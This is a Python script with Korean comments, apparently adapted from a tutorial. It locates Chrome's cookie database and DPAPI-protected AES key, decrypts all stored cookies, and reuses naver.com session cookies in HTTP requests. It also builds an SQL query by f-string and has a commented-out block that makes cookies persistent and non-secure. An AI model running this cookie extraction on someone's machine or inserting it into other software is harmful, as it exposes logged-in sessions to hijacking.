import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
from typing import Any, Optional, Union
import win32crypt  # pip install pypiwin32
from Crypto.Cipher import AES  # pip install pycryptodome


# 코드 출처 : https://www.thepythoncode.com/article/extract-chrome-cookies-python


# 여러 개의 타입이 허용될 수 있는 상황에서는 typing 모듈의 Union을 사용할 수 있습니다.
# 또한 Optional[int]는 Union[int, None] 와 동일
# https://www.daleseo.com/python-typing/

def get_chrome_datetime(chrome_date: int) -> Optional[datetime]:
    """크롬 형식의 날짜 및 시간에서 `datetime.datetime` 객체를 반환합니다.
    `chromedate`는 1601년 1월 1일부터 마이크로초 단위로 지정되어 있습니다."""
    if chrome_date != 86400000000 and chrome_date:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chrome_date)
        except Exception as e:
            print(f"오류: {e}, chromedate: {chrome_date}")
            # return chrome_date
            return None
    else:
        return None


def get_encryption_key() -> bytes:
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # Base64로부터 암호화 키를 디코딩합니다.
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # 'DPAPI' 문자열을 제거합니다.
    key = key[5:]
    # 현재 사용자 로그온 자격 증명에서 유도된 세션 키를 사용하여 원래로 암호화된 키를 반환합니다.
    # 참조: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_data(data: bytes, key: bytes) -> str:
    try:
        # 초기화 벡터를 가져옵니다.
        iv = data[3:15]
        data = data[15:]
        # 암호화 객체 생성
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # 암호화된 비밀번호를 복호화합니다.
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # 지원되지 않음
            return ""


def get_chrome_cookies(target_domain="", for_requests_module=False) -> Union[list, dict]:
    # 로컬 sqlite 크롬 쿠키 데이터베이스 경로
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "Default", "Network", "Cookies")

    # 데이터베이스가 현재 열려 있으면 잠금이 걸리므로 파일을 현재 디렉터리로 "복사"합니다.
    filename = "Cookies.db"
    if not os.path.isfile(filename):
        # 현재 디렉터리에 파일이 없으면 복사합니다.
        shutil.copyfile(db_path, filename)
    # 데이터베이스에 연결합니다.
    db = sqlite3.connect(filename)
    # 디코딩 오류를 무시합니다.
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()

    # `cookies` 테이블에서 쿠키를 가져옵니다.
    if target_domain:
        # 도메인으로도 검색할 수 있습니다. 예: thepythoncode.com
        cursor.execute(f"""
        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
        FROM cookies
        WHERE host_key like '%{target_domain}%'""")
    else:
        # 도메인이 없는 경우 모두 가져옵니다.
        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
        FROM cookies""")

    # 반환할 리스트
    cookies = []

    # AES key 가져오기
    key = get_encryption_key()

    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        # fmt: off
        host_key: str; name: str; value: str; creation_utc: int; last_access_utc: int; expires_utc: int; encrypted_value: bytes
        # fmt: on

        if not value:
            decrypted_value = decrypt_data(encrypted_value, key)
        else:
            # 이미 복호화된 경우
            decrypted_value = value

        cookies.append({
            "host": host_key,
            "name": name,
            "value": decrypted_value,
            "creation_utc": get_chrome_datetime(creation_utc),
            "last_access_utc": get_chrome_datetime(last_access_utc),
            "expires_utc": get_chrome_datetime(expires_utc)
        })

        # 복호화된 값을 사용하여 쿠키 테이블을 업데이트하고 세션 쿠키를 영구 쿠키로 만듭니다.
        # cursor.execute("""
        # UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        # WHERE host_key = ?
        # AND name = ?""", (decrypted_value, host_key, name))

    # 파이썬 requests 모듈 안에서 사용할 쿠키 값인경우
    if for_requests_module:
        cookies = {cookie["name"]: cookie["value"] for cookie in cookies}

    # 변경 사항을 저장합니다.
    db.commit()
    # 연결을 닫습니다.
    db.close()

    # 작업이 완료되었으면 복사한 Cookies.db를 삭제합니다.
    os.remove(filename)
    return cookies


# 모듈 테스트용 (직접 실행시만 실행됨)
if __name__ == '__main__':
    from pprint import pprint  # 깔끔한 출력용 pprint 모듈
    import requests

    # 크롬 쿠키 가져오기
    cookies = get_chrome_cookies()
    print(cookies)

    # 크롬 쿠키를 requests 모듈에서 사용할 수 있는 형식으로 가져오기
    cookies = get_chrome_cookies(for_requests_module=True)
    pprint(cookies)

    # 특정 도메인의 쿠키만 가져오기 (주의 : https:// 는 제외하고 입력)
    cookies = get_chrome_cookies(target_domain=".naver.com")
    pprint(cookies)

    # 특정 도메인의 쿠키를 requests 모듈에서 사용할 수 있는 형식으로 가져오기
    cookies = get_chrome_cookies(
        target_domain=".naver.com", for_requests_module=True)
    pprint(cookies)

    # 가져온 쿠키를 requests 모듈에서 사용하기
    res = requests.get("https://www.naver.com",
                       cookies=cookies)  # type: ignore
    pprint(res.text)
